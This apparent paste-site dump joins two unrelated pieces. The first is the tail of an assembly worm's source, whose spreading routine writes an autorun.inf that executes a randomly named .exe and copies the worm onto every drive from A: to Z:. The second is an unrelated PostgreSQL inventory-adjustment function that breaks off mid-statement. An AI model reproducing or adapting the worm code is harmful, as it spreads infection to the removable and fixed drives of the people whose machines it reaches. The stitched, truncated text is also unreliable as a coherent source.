	cc rA,	     add,     eax, ""X:\a""
	cc rNoRes,   mov,     dword[stAutorunWithDrive], eax
	cc rA,	     mov,     eax, ""\aut""
	cc rNoRes,   mov,     dword[stAutorunWithDrive+2], eax
	cc rA,	     mov,     eax, ""orun""
	cc rNoRes,   mov,     dword[stAutoruninf+3], eax
	cc rA,	     mov,     eax, "".inf""
	cc rNoRes,   mov,     dword[stAutoruninf+7], eax

	cc rA,	     mov,     eax, ""[Aut""
	cc rNoRes,   mov,     dword[stAutoRunContent], eax
	cc rA,	     mov,     eax, ""orun""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x04], eax
	cc rA,	     mov,     eax, 0x530A0D5D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x08], eax
	cc rA,	     mov,     eax, ""hell""			 ; !!!!!!!
	cc rNoRes,   mov,     dword[stAutoRunContent+0x0C], eax
	cc rA,	     mov,     eax, ""Exec""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x10], eax
	cc rA,	     mov,     eax, ""ute=""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x14], eax
	cc rA,	     mov,     eax, dword[RandomFileName]	; Filename: XXXXxxxx.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x18], eax
	cc rA,	     mov,     eax, dword[RandomFileName+0x4]	; Filename: xxxxXXXX.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x1C], eax
	cc rA,	     mov,     eax, "".exe""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x20], eax
	cc rA,	     mov,     eax, 0x73550A0D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x24], eax
	cc rA,	     mov,     eax, ""eAut""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x28], eax
	cc rA,	     mov,     eax, ""opla""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x2C], eax
	cc rA,	     mov,     eax, 0x00313D79
	cc rNoRes,   mov,     dword[stAutoRunContent+0x30], eax



	; i like that coding style, roy g biv! :))
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_ALL_ACCESS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_HIDDEN
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    (GENERIC_READ or GENERIC_WRITE)
	cc rNoRes,   push,    stAutoruninf

	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileAR], eax
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileMappingAR], eax
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]

	cc rAC,      xor,     cl, cl
	cc rACS,     mov,     esi, stAutoRunContent
	MakeAutoRunInfoMore:
		cc rABCS,    mov,     bl, byte[esi]
		cc rACS,     mov,     byte[eax], bl
		cc rACS,     inc,     eax
		cc rACS,     inc,     esi
		cc rACS,     inc,     ecx
		cc rACSF,    cmp,     cl, 51
	cc rNoEmul,  jb,      MakeAutoRunInfoMore

	cc rA,	    sub,     eax, 51
	cc rA,	    push,    dword[hCreateFileAR]
	cc rA,	    push,    dword[hCreateFileMappingAR]
	cc rA,	    push,    eax
	cc rNoEmul, stdcall, dword[_UnmapViewOfFile]
	cc rNoEmul, stdcall, dword[_CloseHandle]
	cc rNoEmul, stdcall, dword[_CloseHandle]

	cc rA,	    mov,     eax, ""A:\.""
	cc rNoEmul, mov,     dword[SpaceForHDC2+1], eax
	cc rA,	    mov,     eax, dword[RandomFileName]
	cc rNoEmul, mov,     dword[RandomFileName2], eax	 ; XXXXxxxx.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x04]
	cc rNoEmul, mov,     dword[RandomFileName2+0x04], eax	 ; xxxxXXXX.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x08]
	cc rNoEmul, mov,     dword[RandomFileName2+0x08], eax	 ; .exe
cc rNoEmul, ret


SpreadThisKitty:
	cc rNoEmul,  call,    CloseRandomFile

	cc rA,	     mov,     eax, 0x003A4100	     ; 0x0, ""A:"", 0x0
	cc rNoRes,   mov,     dword[SpaceForHDC2], eax

    STKAnotherRound:
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoEmul,  stdcall, dword[_GetDriveTypeA]

	cc rAC,      mov,     cl, '\'
	cc rA,	     mov,     byte[SpaceForHDC2+3],cl

	cc rAF,      cmp,     al, 0x2
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x3
	cc rNoEmul,  je,      STKWithoutAutoRun

	cc rAF,      cmp,     al, 0x4
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x6
	cc rNoEmul,  je,      STKWithAutoRun

	cc rNoEmul,  jmp,     STKCreateEntriesForNextDrive

	STKWithAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    stAutorunWithDrive
	cc rNoRes,   push,    stAutoruninf
	cc rNoEmul,  stdcall, dword[_CopyFileA]

	STKWithoutAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CopyFileA]


	STKCreateEntriesForNextDrive:
	cc rA,	     xor,     eax, eax
	cc rA,	     mov,     al, byte[SpaceForHDC2+1]
	cc rAF,      cmp,     al, ""Z""
	cc rNoEmul,  je,      SpreadThisKittyEnd

	cc rA,	     inc,     al
	cc rA,	     mov,     byte[SpaceForHDC2+1], al	      ; next drive
	cc rA,	     mov,     byte[stAutorunWithDrive], al    ; next drive
	cc rA,	     mov,     byte[SpaceForHDC2+3], ah	      ; 0x0, ""X:"", 0x0
    cc rNoEmul,  jmp, STKAnotherRound

    SpreadThisKittyEnd:
	cc rNoEmul,  call,    OpenRandomFileRead
cc rNoEmul,  ret


OpenRandomFileRead:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READONLY
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_READ
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rNoRes,   mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileReadNoProblem   ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileRead

	OpenRandomFileReadNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret



OpenRandomFileWrite:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ or GENERIC_WRITE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_WRITE
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rA,	     mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileWriteNoProblem  ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileWrite

	OpenRandomFileWriteNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret

CloseRandomFile:
	cc rNoRes,   push,    dword[hMapViewRndFile]
	cc rNoEmul,  stdcall, dword[_UnmapViewOfFile]

	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]

	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]
cc rNoEmul,  ret
EndPaddedCommands:
; #####
; #####   Spreading part
; #####
; ###########################################################################
; ###########################################################################


		hAnalyseBehaviourOfCode   dd AnalyseBehaviourOfCode  ; This value must be
						  ; in a protected environment
						  ; because the program has the
						  ; will to self-destruct itself
						  ; as soon as it has some freedom!!!

; ###########################################################################
; ###########################################################################
; #####
; #####   Global BehaviourTable
; #####

; Each Command has a 8bit value in the GBT
; GBT_Entry = X g f e d c b a


; a=1: EAX must have the same value
; b=1: EBX must have the same value
; c=1: ECX must have the same value
; d=1: EDX must have the same value
; e=1: EBP must have the same value
; f=1: ESI must have the same value
; g=1: EDI must have the same value
; X=1: Flags must have the same value
; ESP value must always be the same, therefore there is one bit left for Flags :))

; Special feature: If GBT_Entry=10110101 -> no execution (jumps, rets, call, ...)


GlobalBehaviourTable:
;                Command1 db 10000011b
;                Command2 db 00000011b
		 db GlobalBehaviourTableList

; #####
; #####   Global BehaviourTable
; #####
; ###########################################################################
; ###########################################################################


.end CodeStart

; ""Dr."" stands for ""drunken"" :)"
Jkt21Wi6,in_submit_adjusment_qty,abirama62,PostgreSQL,Tuesday 4th of July 2023 11:30:34 PM CDT,"CREATE OR REPLACE FUNCTION in_submit_adjusment_qty(
	bigint,
	character varying,
	character varying)
    RETURNS void
    LANGUAGE 'plpgsql'
    COST 100
    VOLATILE PARALLEL UNSAFE
AS $BODY$
DECLARE
    pTenantId			ALIAS FOR $1;
    pSessionId			ALIAS FOR $2;
	pProcessNo			ALIAS FOR $3;

	vProcessId			bigint;
	vAdjQtyId			bigint;
	vUserId				bigint;
	vDatetime			character varying(14);
	vFlagNo		 		character varying(1);
	vFlagYes			character varying(1);
	vEmptyId			bigint;
	vActivityCOA 		character varying(20);
	vStatusRelease  	character varying(1);
	vFinalTransaction  	character varying(1);
	vStatusDraft  		character varying(1);	
	vEmptyValue  		character varying(1);	
	vJournalType		character varying(20);
	vSignDebit			character varying(1);
	vSignCredit			character varying(1);
	vFlgKonsinyasi		character varying(1);
	vTypeRate			character varying(3);
	vProductCOA			character varying(10);
	vParentOuId			bigint;		
	vJournalTrxId		bigint;
	vOuId						bigint;
	vOuWarehouseIdForJournal	bigint;
	vStockOpnameDoc		character varying(10);
	vRefDocTypeId		character varying(10);
	vRefId				bigint;
	
	vDocJournal					DOC_JOURNAL%ROWTYPE;
	vOuStructure				OU_BU_STRUCTURE%ROWTYPE;
	vOuStructureJournalItem		OU_BU_STRUCTURE%ROWTYPE;
	result						RECORD;	
	
	vOuWarehouseId		bigint;
	vOutletId			bigint;
	vDbVersion			character varying(10);
	
BEGIN
	
	vEmptyId := -99;
	vFlagNo := 'N';
	vFlagYes := 'Y';
	vActivityCOA := 'ACTIVITY';
	vStatusRelease := 'R';
	vStatusDraft := 'D';
	vFinalTransaction := 'F';	
	vSignDebit := 'D';
	vSignCredit := 'C';
	vTypeRate := 'COM';
	vProductCOA := 'PRODUCT';
	vEmptyValue := ' ';
	vFlgKonsinyasi := '';
	vStockOpnameDoc := 539L;
	
	
	SELECT A.process_message_id INTO vProcessId
	FROM t_process_message A
	WHERE A.tenant_id = pTenantId AND
		A.process_name = 'in_submit_adjusment_qty' AND
		A.process_no = pProcessNo;
		
	SELECT CAST(A.process_parameter_value AS bigint) INTO vAdjQtyId
	FROM t_process_parameter A
	WHERE A.process_message_id = vProcessId AND
		A.process_parameter_key = 'adjQtyId';
	
	SELECT CAST(A.process_parameter_value AS bigint) INTO vUserId
	FROM t_process_parameter A
	WHERE A.process_message_id = vProcessId AND
		A.process_parameter_key = 'userId';

	SELECT CAST(A.process_parameter_value AS character varying(14)) INTO vDatetime
	FROM t_process_parameter A
	WHERE A.process_message_id = vProcessId AND
		A.process_parameter_key = 'datetime';
		
	DELETE FROM tt_journal_trx_item WHERE session_id = pSessionId;
	DELETE FROM tt_in_product_balance WHERE session_id = pSessionId;
	/*
	 * 1.update status doc in_inventory
	 * 2.add in_produuct_balance untuk product_balance_id = -99
	 * 3.add/update in_product_balance_stock, krn qty > 0
	 * 4.insert data ke in_log_product_balance_stock
	 * 5.buat log jika ou merupakan ou outlet
	 * 6.jurnal trx : 
	 *  jika qty > 0
	 *   Debit Stok
	 *   Credit activity
	 *  jika qty < 0
	 *   Credit Stok
	 *   Debit activity
	 */
	
	SELECT f_get_ou_bu_structure(A.ou_from_id) AS ou, f_get_document_journal(A.doc_type_id) as doc
	FROM in_inventory A
	WHERE A.inventory_id = vAdjQtyId INTO result;
		
	vOuStructure := result.ou;
	vDocJournal := result.doc;	
	
	UPDATE in_inventory SET status_doc = vStatusRelease, update_datetime = vDatetime, update_user_id = vUserId 
	WHERE inventory_id = vAdjQtyId;

	/*
	 * mengambil data dari in_inventory_item tanpa melakukan group by untuk ditampung ke tt_in_product_balance
	 */
	INSERT INTO tt_in_product_balance
	(session_id, tenant_id, inventory_id, inventory_item_id, product_balance_id, product_id, product_status,
	 serial_number, product_expired_date, product_year_made, lot_number, qty_realization, base_uom_id, flg_buy_konsinyasi)
	SELECT pSessionId, A.tenant_id, A.inventory_id, B.inventory_item_id, B.product_balance_id, B.product_id, B.product_status,
		B.serial_number, B.product_expired_date, B.product_year_made, B.lot_number, B.qty_realization, B.base_uom_id, vFlagNo
	FROM in_inventory A, in_inventory_item B
	WHERE A.inventory_id = B.inventory_id AND
		A.inventory_id = vAdjQtyId;
		
	/**
	 * Update untuk yang flg_buy_konsinyasi Y
	 * 
	 */
	UPDATE 	tt_in_product_balance Z
	SET flg_buy_konsinyasi = vFlagYes
	FROM m_product_custom A
	WHERE A.product_id = Z.product_id
	AND A.flg_buy_konsinyasi = vFlagYes
	AND session_id = pSessionId;
	
	/*
	 * add product balance yang belum ada
	 */	
	INSERT INTO in_product_balance
	(tenant_id, product_id, serial_number, lot_number,
	product_expired_date, product_year_made,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, A.product_id, A.serial_number, A.lot_number,
		A.product_expired_date, A.product_year_made,
		0, vDatetime, vUserId, vDatetime, vUserId
	FROM tt_in_product_balance A
	WHERE A.session_id = pSessionId AND
		A.product_balance_id = vEmptyId AND
		NOT EXISTS (SELECT 1 FROM in_product_balance B
					WHERE A.tenant_id = B.tenant_id AND
						A.product_id = B.product_id AND
						A.serial_number = B.serial_number AND
						A.lot_number = B.lot_number)
	GROUP BY A.tenant_id, A.product_id, A.serial_number, A.lot_number,
		A.product_expired_date, A.product_year_made;
	
	/*
	 * update product balance id sesuai dengan data yang ada
	 */
	UPDATE tt_in_product_balance SET product_balance_id = A.product_balance_id
	FROM in_product_balance A
	WHERE tt_in_product_balance.session_id = pSessionId AND
		tt_in_product_balance.product_id = A.product_id AND
		tt_in_product_balance.tenant_id = A.tenant_id AND
		tt_in_product_balance.serial_number = A.serial_number AND
		tt_in_product_balance.lot_number = A.lot_number AND
		tt_in_product_balance.product_balance_id = vEmptyId;
		
	WITH tt_in_product_price_balance_summary AS (
		SELECT 	B.session_id, A.inventory_id, A.warehouse_from_id AS warehouse_id, A.tenant_id, B.product_id, 
				B.product_balance_id, B.product_status, SUM(B.qty_realization) AS qty_sum
		FROM 	in_inventory A, tt_in_product_balance B
		WHERE 	B.session_id = pSessionId
			AND A.inventory_id = B.inventory_id
		GROUP BY B.session_id, A.inventory_id, A.warehouse_from_id, A.tenant_id, B.product_id, 
				 B.product_balance_id, B.product_status
	)
	UPDATE in_product_balance_stock 
	SET qty = qty + B.qty_sum, update_datetime = vDatetime, update_user_id = vUserId, version = version + 1
	FROM tt_in_product_price_balance_summary B
	WHERE B.inventory_id = vAdjQtyId AND
		B.session_id = pSessionId AND
		in_product_balance_stock.tenant_id = B.tenant_id AND
		in_product_balance_stock.warehouse_id = B.warehouse_id AND
		in_product_balance_stock.product_id = B.product_id AND
		in_product_balance_stock.product_balance_id = B.product_balance_id AND
		in_product_balance_stock.product_status = B.product_status AND
		B.qty_sum > 0;
						
	/*
	 * insert data in_product_balance_stock
	 */	
	INSERT INTO in_product_balance_stock
	(tenant_id, warehouse_id, product_id, product_balance_id, product_status, base_uom_id, qty,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, A.warehouse_from_id, B.product_id, B.product_balance_id, B.product_status, B.base_uom_id, SUM(B.qty_realization),
			0, vDatetime, vUserId, vDatetime, vUserId
	FROM in_inventory A, tt_in_product_balance B
	WHERE B.session_id = pSessionId AND
		A.inventory_id = B.inventory_id AND
		A.inventory_id = vAdjQtyId AND
		NOT EXISTS (SELECT 1 FROM in_product_balance_stock C
					WHERE C.tenant_id = A.tenant_id AND
						C.warehouse_id = A.warehouse_from_id AND
						C.product_id = B.product_id AND
						C.product_balance_id = B.product_balance_id AND
						C.product_status = B.product_status)
	GROUP BY A.tenant_id, A.warehouse_from_id, B.product_id, B.product_balance_id, B.product_status, B.base_uom_id;
		
	/*
	 * membuat data in_log_product_balance_stock, dengan cara memisahkan antara qty > 0 dan qty < 0 
	 */
	INSERT INTO in_log_product_balance_stock
	(tenant_id, ou_id, doc_type_id, ref_id, doc_no, doc_date, partner_id,
	 product_id, product_balance_id, warehouse_id, product_status, base_uom_id, qty,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id, SUM(B.qty_realization),
		0, vDatetime, vUserId, vDatetime, vUserId
	FROM in_inventory A, tt_in_product_balance B, m_warehouse_ou C
	WHERE A.inventory_id = vAdjQtyId AND
		A.inventory_id = B.inventory_id AND
		B.session_id = pSessionId AND
		B.qty_realization > 0 AND
		B.flg_buy_konsinyasi = vFlagNo AND
		A.warehouse_from_id = C.warehouse_id
	GROUP BY A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id;
	
	INSERT INTO in_log_product_balance_stock
	(tenant_id, ou_id, doc_type_id, ref_id, doc_no, doc_date, partner_id,
	 product_id, product_balance_id, warehouse_id, product_status, base_uom_id, qty,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id, SUM(B.qty_realization),
		0, vDatetime, vUserId, vDatetime, vUserId
	FROM in_inventory A, tt_in_product_balance B, m_warehouse_ou C
	WHERE A.inventory_id = vAdjQtyId AND
		A.inventory_id = B.inventory_id AND
		B.session_id = pSessionId AND
		B.qty_realization < 0 AND
		B.flg_buy_konsinyasi = vFlagNo AND
		A.warehouse_from_id = C.warehouse_id
	GROUP BY A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id;

	/* 
	 * Membuat log untuk produk konsinyasi
	 */		
	INSERT INTO in_log_product_consignment_balance_stock
	(tenant_id, ou_id, doc_type_id, ref_id, doc_no, doc_date, partner_id,
	 product_id, product_balance_id, warehouse_id, product_status, base_uom_id, qty,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id, SUM(B.qty_realization),
		0, vDatetime, vUserId, vDatetime, vUserId
	FROM in_inventory A, tt_in_product_balance B, m_warehouse_ou C
	WHERE A.inventory_id = vAdjQtyId AND
		A.inventory_id = B.inventory_id AND
		B.session_id = pSessionId AND
		B.qty_realization > 0 AND
		B.flg_buy_konsinyasi = vFlagYes AND
		A.warehouse_from_id = C.warehouse_id
	GROUP BY A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id;
	
	INSERT INTO in_log_product_consignment_balance_stock
	(tenant_id, ou_id, doc_type_id, ref_id, doc_no, doc_date, partner_id,
	 product_id, product_balance_id, warehouse_id, product_status, base_uom_id, qty,
	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
	SELECT A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id, SUM(B.qty_realization),
		0, vDatetime, vUserId, vDatetime, vUserId
	FROM in_inventory A, tt_in_product_balance B, m_warehouse_ou C
	WHERE A.inventory_id = vAdjQtyId AND
		A.inventory_id = B.inventory_id AND
		B.session_id = pSessionId AND
		B.qty_realization < 0 AND
		B.flg_buy_konsinyasi = vFlagYes AND
		A.warehouse_from_id = C.warehouse_id
	GROUP BY A.tenant_id, C.ou_id, A.doc_type_id, A.inventory_id, A.doc_no, A.doc_date, A.partner_id,
		B.product_id, B.product_balance_id, A.warehouse_from_id, B.product_status, B.base_uom_id;
		
		
	/*
	 * buat data log untuk update stok outlet jika ou ini adalah ou outlet
	 * */
		
	-- cek dulu warehouse ou nya	
	SELECT B.ou_id INTO vOuWarehouseId
	FROM in_inventory A
	INNER JOIN m_warehouse_ou B ON A.warehouse_from_id = B.warehouse_id
	WHERE A.inventory_id = vAdjQtyId;
	
	IF vOuWarehouseId IS NULL THEN
		vOuWarehouseId = vEmptyId;
	END IF;
		
	-- cek dulu apakah ou yang digunakan ini merupakan ou outlet
	 -- 25 okt 2021, erl,cari yg outler nya non embedded 
	IF EXISTS(SELECT 1 FROM i_outlet A WHERE A.ou_id = vOuWarehouseId) THEN
		SELECT A.outlet_id INTO vOutletId
		FROM i_outlet A WHERE A.ou_id = vOuWarehouseId AND A.flg_embedded = vFlagNo;
	END IF;
	
	IF vOutletId IS NULL THEN
		vOutletId = vEmptyId;
	END IF;
		
	-- jika outlet, maka harus tulis data log agar outlet bisa lakukan update
	-- 25 okt 2021, erl,hanya insert i_trx_data_log jika outlet non embeded
	IF vOutletId <> vEmptyId THEN
		vDbVersion := f_get_value_system_config_by_param_code(pTenantId, 'DbVersion');
	
		INSERT INTO i_trx_data_log(
            tenant_id, ou_id, doc_date, db_version, type_data, 
            mode_log, data_log, version, create_datetime, create_user_id, 
            update_datetime, update_user_id)
        SELECT B.tenant_id, B.ou_id, B.doc_date, vDbVersion, 'in_product_balance',
        	   'A', '{""id"":'||C.product_balance_id||',""tenantId"":""'||C.tenant_id||'"",""productId"":'||C.product_id||',""serialNumber"":""'||C.serial_number||'"",""lotNumber"":""'||C.lot_number||'"",""productExpiredDate"":""'||C.product_expired_date||'"",""productYearMade"":""'||C.product_year_made||'"",""createDateTime"":""'||C.create_datetime||'"",""createUserId"":'||C.create_user_id||',""version"":'||C.version||',""updateDateTime"":""'||C.update_datetime||'"",""updateUserId"":'||C.update_user_id||'}',
        	   0, vDatetime, vUserId, vDatetime, vUserId
        FROM in_inventory A
        INNER JOIN in_log_product_balance_stock B
        	ON A.tenant_id = B.tenant_id 
        	AND A.doc_no = B.doc_no
        	AND A.doc_date = B.doc_date
        	AND A.doc_type_id = B.doc_type_id
        	AND A.inventory_id = B.ref_id
        	AND A.warehouse_from_id = B.warehouse_id
        INNER JOIN in_product_balance C
        	ON B.product_balance_id = C.product_balance_id
        WHERE A.inventory_id = vAdjQtyId
        GROUP BY B.tenant_id, B.ou_id, B.doc_date, C.product_balance_id;
		
		INSERT INTO i_trx_data_log(
            tenant_id, ou_id, doc_date, db_version, type_data, 
            mode_log, data_log, version, create_datetime, create_user_id, 
            update_datetime, update_user_id)
        SELECT B.tenant_id, B.ou_id, B.doc_date, vDbVersion, 'in_log_product_balance_stock',
        	   'A', '{""tenantId"":'||B.tenant_id||',""createDateTime"":""'||B.create_datetime||'"",""baseUomId"":'||B.base_uom_id||',""ouId"":'||B.ou_id||',""docNo"":""'||B.doc_no||'"",""refId"":'||B.ref_id||',""partnerId"":'||B.partner_id||',""qty"":'||B.qty||',""warehouseId"":'||B.warehouse_id||',""version"":'||B.version||',""productId"":'||B.product_id||',""updateUserId"":'||B.update_user_id||',""productStatus"":""'||B.product_status||'"",""docDate"":""'||B.doc_date||'"",""updateDateTime"":""'||B.update_datetime||'"",""productBalanceId"":'||B.product_balance_id||',""createUserId"":'||B.create_user_id||',""docTypeId"":'||B.doc_type_id||'}', 
        	   0, vDatetime, vUserId, vDatetime, vUserId
        FROM in_inventory A
        INNER JOIN in_log_product_balance_stock B
        	ON A.tenant_id = B.tenant_id 
        	AND A.doc_no = B.doc_no
        	AND A.doc_date = B.doc_date
        	AND A.doc_type_id = B.doc_type_id
        	AND A.inventory_id = B.ref_id
        	AND A.warehouse_from_id = B.warehouse_id
        WHERE A.inventory_id = vAdjQtyId;
	END IF;
	
	/*
	 * @author TKP, 9 Jun 2016
	 * Cek jika OU pada warehouse sama dengan OU pada dokumen maka nilai ou_bu_id dan ou_sub_bu_id =-99 
	 * jika OU pada warehouse tidak sama dengan OU pada dokumen maka nilai ou_bu_id dan ou_sub_bu_id didapat pada f_get_ou_bu_structure;
	 */

	SELECT A.ou_from_id, B.ou_id INTO vOuId, vOuWarehouseIdForJournal
	FROM in_inventory A
	INNER JOIN m_warehouse_ou B ON A.warehouse_from_id = B.warehouse_id
	WHERE A.inventory_id = vAdjQtyId;
	
	IF (vOuId <> vOuWarehouseIdForJournal) THEN
		SELECT f_get_ou_bu_structure(vOuWarehouseIdForJournal) as ou_structure INTO result;
		vOuStructureJournalItem := result.ou_structure;
	ELSE
		vOuStructureJournalItem := ROW(-99, -99, -99);
	END IF;
	
	/*
	 * @author anton, 19 April 2022
	 * Add data ke table pj_wo_project_real_product
	 */
	 
	 PERFORM in_insert_real_product(vAdjQtyId, vDatetime, vUserId);
	
	/*
	 * @author PS, 23 Agustus 2016
	 * cek product konsinyasi, apabila semua productnya konsinyasi, maka tidak perlu tulis ke jurnal
	 */
	SELECT flg_buy_konsinyasi FROM tt_in_product_balance WHERE flg_buy_konsinyasi = vFlagNo INTO vFlgKonsinyasi;
	
	IF FOUND THEN
		/*
		 * journal adjusment qty
		 * Debit Inventory, jika qty > 0
		 * Credit Inventory, jika qty < 0
		 * 
		 * Mapping ke account activity gl
		 */	
		/*
		 * membuat data transaksi jurnal :
		 * 1. buat admin
		 * 2. buat temlate jurnal
		 */		
		PERFORM gl_manage_admin_journal_trx(A.tenant_id, (vOuStructure).ou_bu_id, A.ou_from_id, (vDocJournal).journal_type, (vDocJournal).ledger_code, f_get_year_month_date(A.doc_date), 'MONTHLY', vDatetime, vUserId)
		FROM in_inventory A
		WHERE A.inventory_id = vAdjQtyId;
			
		SELECT NEXTVAL('gl_journal_trx_seq') INTO vJournalTrxId;
		
		INSERT INTO gl_journal_trx
		(journal_trx_id, tenant_id, journal_type, doc_type_id, doc_id, doc_no, doc_date,
	  	ou_bu_id, ou_branch_id, ou_sub_bu_id, partner_id, cashbank_id, warehouse_id, ext_doc_no, ext_doc_date,  
	  	ref_doc_type_id, ref_id, due_date, curr_code, remark, status_doc, workflow_status, 
	  	""version"", create_datetime, create_user_id, update_datetime, update_user_id)
